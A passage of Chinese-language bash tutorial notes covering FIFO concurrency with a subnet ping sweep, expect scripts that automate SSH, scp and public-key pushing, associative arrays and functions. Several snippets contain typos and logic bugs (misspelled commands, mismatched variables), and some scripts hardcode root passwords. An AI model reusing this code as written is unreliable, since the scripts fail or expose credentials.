class="comment"># 创建</span></span><br><span class="line">ll /dev &gt; /tmp/fifo1 <span class="comment"># 把dev重定向到管道中，另一个终端就可以用了</span></span><br><span class="line"><span class="comment"># 另一个终端使用： </span></span><br><span class="line">grep <span class="string">'sda'</span> /tmp/fifo1</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">thread=5</span><br><span class="line">tmp_fifofile=/tmp/$$.fifo</span><br><span class="line"></span><br><span class="line">mkfifo <span class="variable">$tmp_fifofile</span></span><br><span class="line"><span class="built_in">exec</span> 8&lt;&gt; <span class="variable">$tmp_fifofile</span></span><br><span class="line">rm <span class="variable">$tmp_fifofile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq <span class="variable">$thread</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> &gt;&amp;8   <span class="comment"># 操作的是文件描述符（）</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..254&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">read</span> -u 8    <span class="comment"># -u 是读取文件描述符内容（逐行）</span></span><br><span class="line">&#123;</span><br><span class="line">ip=192.168.0.<span class="variable">$i</span></span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up."</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> &gt;&amp;8  <span class="comment"># 有借有还（借一个还一个，不能让文件描述符里面空）</span></span><br><span class="line">&#125;&amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"执行结束.  .."</span></span><br><span class="line"><span class="comment"># 执行结果是5个5个出来的（因为定义的进程是5个）</span></span><br></pre></td></tr></table></figure><h5 id="expect"><a href="#expect" class="headerlink" title="expect"></a>expect</h5><p> expect —-&gt; 不是shell，是一个新的语言</p><p>解决交互的繁琐操作</p><p>安装：<code>apt install expect</code></p><p>expect实现批量远程命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果for while，需要一步步的交互(比较麻烦)，但是可以使用公钥认证(ssh-keygen,ssh-copy-id)</span></span><br><span class="line"><span class="comment">#第一步，实现了公钥认证</span></span><br><span class="line"><span class="comment"># ps:如果登录的新的机器与之前的指纹不一样，先删除本地保存的信息</span></span><br><span class="line"><span class="comment"># expect打前站，先把公钥推过去，后面再用别的实现</span></span><br></pre></td></tr></table></figure><p>ssh初级例子1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/expect</span></span><br><span class="line"><span class="built_in">set</span> ip 192.168.0.1</span><br><span class="line"><span class="built_in">set</span> user root</span><br><span class="line"><span class="built_in">set</span> passwd 123456</span><br><span class="line"><span class="built_in">set</span> timeout 5</span><br><span class="line"></span><br><span class="line">spawn ssh <span class="variable">$user</span>@<span class="variable">$ip</span></span><br><span class="line">expect &#123;   <span class="comment">#就是把接下来要出现的字符串等提前写好</span></span><br><span class="line"><span class="string">"yes/no"</span> &#123; send <span class="string">"yes\r"</span>; exp_continue &#125;  <span class="comment"># 当出现什么，怎么处理(没出现就继续)</span></span><br><span class="line"><span class="string">"password:"</span> &#123; send <span class="string">"<span class="variable">$passwd</span>\r"</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line">interact  <span class="comment">#交互停在对方那边不退出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行脚本: expect test.sh</span></span><br></pre></td></tr></table></figure><p>ssh初级例子2(升级版)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/expect</span></span><br><span class="line"><span class="built_in">set</span> ip [lindex <span class="variable">$argv</span> 0]   <span class="comment"># 第一个位置参数(与shell的不通)</span></span><br><span class="line"><span class="built_in">set</span> user [lindex <span class="variable">$argv</span> 1]</span><br><span class="line"><span class="built_in">set</span> passwd 123456</span><br><span class="line"><span class="built_in">set</span> timeout 5</span><br><span class="line"></span><br><span class="line">spawn ssh <span class="variable">$user</span>@<span class="variable">$ip</span></span><br><span class="line">expect &#123;   <span class="comment">#就是把接下来要出现的字符串等提前写好</span></span><br><span class="line"><span class="string">"yes/no"</span> &#123; send <span class="string">"yes\r"</span>; exp_continue &#125;  <span class="comment"># 当出现什么，怎么处理(没出现就继续)</span></span><br><span class="line"><span class="string">"password:"</span> &#123; send <span class="string">"<span class="variable">$passwd</span>\r"</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#interact  # 交互停在对方那边不退出来</span></span><br><span class="line"><span class="comment"># 干点别的事情</span></span><br><span class="line">expect <span class="string">"#"</span>            <span class="comment"># 不用大括号也可以</span></span><br><span class="line"><span class="comment">#send "useradd xps\r"</span></span><br><span class="line">send <span class="string">"pwd\r"</span></span><br><span class="line">send <span class="string">"exit\r"</span></span><br><span class="line">expect eof  <span class="comment"># 结束expect</span></span><br></pre></td></tr></table></figure><p>例子3：scp传递文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">######## 升级版</span></span><br><span class="line"><span class="comment">#!/usr/bin/expect</span></span><br><span class="line"><span class="built_in">set</span> ip [lindex <span class="variable">$argv</span> 0]   <span class="comment"># 第一个位置参数(与shell的不通)</span></span><br><span class="line"><span class="built_in">set</span> user [lindex <span class="variable">$argv</span> 1]</span><br><span class="line"><span class="built_in">set</span> passwd 123456</span><br><span class="line"><span class="built_in">set</span> timeout 5</span><br><span class="line"></span><br><span class="line">spawn scp -r /etc/xxx <span class="variable">$user</span>@<span class="variable">$ip</span>:/tmp</span><br><span class="line"></span><br><span class="line">expect &#123;   <span class="comment">#就是把接下来要出现的字符串等提前写好</span></span><br><span class="line"><span class="string">"yes/no"</span> &#123; send <span class="string">"yes\r"</span>; exp_continue &#125;  <span class="comment"># 当出现什么，怎么处理(没出现就继续)</span></span><br><span class="line"><span class="string">"password:"</span> &#123; send <span class="string">"<span class="variable">$passwd</span>\r"</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line">expect eof  <span class="comment"># 结束expect</span></span><br></pre></td></tr></table></figure><p>例子4： 推公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell与expect一起用</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">&gt;ip.txt</span><br><span class="line">passwd=123</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试expect有没有装(以centos为例)</span></span><br><span class="line">rpm -q expect &amp;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0  ];<span class="keyword">then</span></span><br><span class="line">yum -y install expect</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否有公钥</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f ~/.ssh/id_rsa ];<span class="keyword">then</span></span><br><span class="line">ssh-keygen -P <span class="string">"123"</span> -f ~/.ssh/id_rsa <span class="comment"># 指定公钥的密码和位置</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;2..254&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">ip=192.168.0.<span class="variable">$i</span></span><br><span class="line">pign -c1 -W1 <span class="variable">$ip</span> &amp;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> &gt;&gt; ip.txt</span><br><span class="line"><span class="comment"># 开始expect</span></span><br><span class="line">/usr/bin/expect &lt;&lt;-EOF</span><br><span class="line"><span class="built_in">set</span> timeout 10</span><br><span class="line">spawn ssh-copy-id <span class="variable">$ip</span>      <span class="comment"># 推送公钥。 前面必须都是tab，不能有空格（:set list 查看是tab还是空格）</span></span><br><span class="line">expect &#123;</span><br><span class="line"><span class="string">"yse/no"</span> &#123; send <span class="string">"yes\r"</span>; exp_continue &#125;</span><br><span class="line"><span class="string">"password:"</span> &#123; send <span class="string">"<span class="variable">$passwd</span>\r"</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line">expect eof</span><br><span class="line">EOF</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;&amp;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"finish..."</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上一个例子, 已经实现了公钥认证，后面的操作就可以使用shell了，基本不用expect了</span></span><br><span class="line"><span class="comment"># 重启之后查看机器的ip，直接用get_ip.sh脚本（就不用了一个一个去看了）</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">&gt;ping.txt</span><br><span class="line"><span class="comment"># &#123;2..254&#125;  集合，  另一个序列: seq `2 254`</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;2..254&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = 192.168.111.<span class="variable">$i</span></span><br><span class="line">ping -c1 -W1 <span class="variable">$ip</span> &amp;&gt;/dev/null  </span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span>"</span> | tee -a ping.txt</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;&amp;    】</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">wait</span>    </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"finish !!!"</span></span><br></pre></td></tr></table></figure><h4 id="五-数组"><a href="#五-数组" class="headerlink" title="五.数组"></a>五.数组</h4><p>没有多维数组这个概念</p><p><strong>定义</strong></p><p>1.普通数组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通数组：只能使用整数作为数组索引</span></span><br><span class="line">books=(linux shell awk docker)</span><br><span class="line">books=(linux shell awk [20]=docker)  <span class="comment"># 索引20为docker</span></span><br><span class="line"><span class="comment"># 从文件赋值</span></span><br><span class="line">books2=(`cat /etc/passwd`)</span><br><span class="line">books=(`ls /etc/`)</span><br><span class="line"><span class="comment"># 中间值可以跳过</span></span><br></pre></td></tr></table></figure><p>2.关联数组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关联数组：可以使用字符串作为数组索引（相当于字典）</span></span><br><span class="line"><span class="built_in">declare</span> -A info <span class="comment"># 先声明是关联数组</span></span><br><span class="line">info ([name]=xps [sex]=male [age]=20 [skill]=security)  <span class="comment"># 赋值</span></span><br></pre></td></tr></table></figure><p><strong>使用</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;books[3]&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;info[name]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有的数组</span></span><br><span class="line"><span class="built_in">declare</span> -a</span><br><span class="line"><span class="comment"># 查看所有的关联数组</span></span><br><span class="line"><span class="built_in">declare</span> -A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数组元素的索引号</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;info[@:1]&#125;</span>   <span class="comment"># 从数组下标1开始</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;info[@:1:2]&#125;</span>   <span class="comment"># 从数组下标1开始，访问两个元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有的索引key</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;!info[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计元素个数</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#info[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组中所有元数（等同于： $&#123;info[*]&#125;     ）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;info[@]&#125;</span></span><br></pre></td></tr></table></figure><p><strong>遍历</strong></p><p>1.按照个数遍历</p><p>2.按照索引遍历</p><p>例子:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#while方式</span></span><br><span class="line">i=0</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">hosts[++i]=<span class="variable">$line</span>    <span class="comment">#hosts是个数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span> &lt;/etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="variable">$&#123;!hosts[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;hosts[i]&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">########################################################################3</span></span><br><span class="line"><span class="comment"># for方式   不是以换行分割（按照空格,tab等分割）</span></span><br><span class="line">OLD_IFS=<span class="variable">$IFS</span></span><br><span class="line">IFS=$<span class="string">'\n'</span>  <span class="comment"># 解决</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;!hosts[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;hosts[i]&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="variable">$&#123;!hosts[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;hosts[i]&#125;</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">IFS=<span class="variable">$OLD_IFS</span>   <span class="comment"># 不是全文都要，如果后门想用回车作为分隔符号</span></span><br></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 1. 性别次数统计</span></span><br><span class="line"><span class="comment">## 其实用awk一行搞定</span></span><br><span class="line">awk <span class="string">'&#123;print $2&#125;'</span> sex.txt |sort |uniq -c</span><br><span class="line"></span><br><span class="line"><span class="comment">## 这里还是先学基础的（`把要统计的对象作为数组的索引` ，首先是关联数组）</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">declare</span> -A sex</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment"># 里面的第二列（m/f）</span></span><br><span class="line"><span class="built_in">type</span>=`<span class="built_in">echo</span> <span class="variable">$line</span> |awk <span class="string">'&#123;print $2&#125;'</span>`</span><br><span class="line"><span class="built_in">let</span> sex[<span class="variable">$type</span>]++    <span class="comment"># sex[m]++ 性别的数量增加 </span></span><br><span class="line"><span class="keyword">done</span> &lt; sex.txt</span><br><span class="line"><span class="comment"># 遍历(通过索引)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;!sex[@]&#125;</span>       <span class="comment"># 获取所有的索引key</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;sex[$i]&#125;</span>"</span>   <span class="comment">#变量尽量加$</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 2. 统计不同类型shell的数量</span></span><br><span class="line"><span class="comment"># /etc/passwd中</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">declare</span> -A shells   <span class="comment"># 先定义关联数组</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment"># 里面的第二列</span></span><br><span class="line"><span class="built_in">type</span>=`<span class="built_in">echo</span> <span class="variable">$line</span> |awk -F<span class="string">":"</span> <span class="string">'&#123;print $7&#125;'</span>`  <span class="comment">#按照冒号分割   &#123;print $NF&#125;最后一列</span></span><br><span class="line"><span class="built_in">let</span> shells[<span class="variable">$type</span>]++    <span class="comment"># sex[m]++ 性别的数量增加 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span> &lt; /etc/passwd</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;!shells[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;shells[$i]&#125;</span>"</span>   <span class="comment"># /bin/bash :  5</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 这是awk的强项</span></span><br><span class="line">awk -F<span class="string">":"</span> <span class="string">'&#123;print $NF&#125;'</span> /etc/passwd |sort |uniq -c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 3. 统计tcp连接状态数量</span></span><br><span class="line"><span class="comment">#ss -an |grep 80</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">unset</span> status  <span class="comment"># 取消， 重新声明</span></span><br><span class="line"><span class="built_in">declare</span> -A status   <span class="comment"># 先定义关联数组</span></span><br><span class="line"><span class="built_in">type</span>=`ss -an |grep :80 |aek <span class="string">'&#123;print $2&#125;'</span>`  <span class="comment"># 要统计的(是一个arr)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$type</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">let</span> status[<span class="variable">$i</span>]++    </span><br><span class="line"><span class="keyword">done</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;!status[@]&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$i</span>: <span class="variable">$&#123;status[$i]&#125;</span>"</span>    <span class="comment"># SYN-SENT: 5</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">sleep 1</span><br><span class="line">clear</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 思想: 把要统计的对象最为索引，一直累加</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 拓展：</span></span><br><span class="line"><span class="comment">## 一.如果想一直看</span></span><br><span class="line"><span class="comment"># 1. watch -n2 test.sh   # 每几秒看一次</span></span><br><span class="line"><span class="comment"># 2. 脚本里面while循环(更麻烦)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 二.vim部分复制粘贴：  </span></span><br><span class="line"><span class="comment"># ^V 块选择，然后按y复制， 最后找到地方p粘贴</span></span><br></pre></td></tr></table></figure><h4 id="六-函数"><a href="#六-函数" class="headerlink" title="六.函数"></a>六.函数</h4><p><strong>定义</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># F1:</span></span><br><span class="line">函数名()&#123;</span><br><span class="line">功能</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># F2:</span></span><br><span class="line">funcion 函数名&#123;</span><br><span class="line">功能</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用</strong></p><p>调用1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#例子：阶乘</span></span><br><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"><span class="function"><span class="title">factorial</span></span>()&#123;</span><br><span class="line">fat=1</span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;=50;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">fac=$[<span class="variable">$fac</span>*<span class="variable">$i</span>]</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"5的阶乘:<span class="variable">$fac</span>"</span></span><br><span class="line">&#125;</span><br><span class="line">factorial   <span class="comment"># 调用</span></span><br></pre></td></tr></table></figure><p>调用2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/env bash</span></span><br><span class="line"><span class="function"><span class="title">factorial</span></span>()&#123;</span><br><span class="line">fat=1</span><br><span class="line"><span class="keyword">for</span>((i=1;i&lt;=<span class="variable">$num</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">fac=$[<span class="variable">$fac</span>*<span class="variable">$i</span>]</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$num</span>的阶乘:<span class="variable">$fac</span>"</span></span><br><span class="line">&#125;</span><br><span class="line">num=5 <span class="comment"># 调用之前先定义变量</span></span><br><span class="line">factorial</span><br></pre></td></tr></table></figure><p>调用3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 